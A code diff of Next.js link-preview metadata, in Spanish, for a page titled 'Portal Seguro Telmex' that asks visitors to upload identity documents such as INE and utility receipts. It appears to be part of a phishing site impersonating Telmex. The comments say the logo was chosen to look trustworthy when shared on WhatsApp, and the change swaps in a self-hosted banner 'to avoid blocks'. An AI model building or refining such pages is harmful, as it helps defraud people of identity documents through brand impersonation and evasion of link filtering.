@@ -12,11 +12,11 @@ export const metadata: Metadata = {
         locale: 'es_MX',
         images: [
             {
-                // Un logotipo oficial de Telmex público que se verá confiable en WhatsApp
-                url: 'https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/Telmex_Logo.svg/1200px-Telmex_Logo.svg.png',
+                // Un banner profesional y seguro generado específicamente para evitar bloqueos
+                url: 'https://telmex-panel.vercel.app/og-telmex.png',
                 width: 1200,
                 height: 630,
-                alt: 'Logo de Telmex',
+                alt: 'Portal Web Telmex - Envío Seguro',
             }
         ]
     },
@@ -24,7 +24,7 @@ export const metadata: Metadata = {
         card: 'summary_large_image',
         title: '🔒 Portal Seguro Telmex | Envío de Documentos',
         description: 'Adjunta tus requisitos oficiales (INE, recibo, etc.) en este enlace para agilizar tu trámite de contratación con Telmex Infinitum.',
-        images: ['https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/Telmex_Logo.svg/1200px-Telmex_Logo.svg.png'],
+        images: ['https://telmex-panel.vercel.app/og-telmex.png'],
     }
 };
 
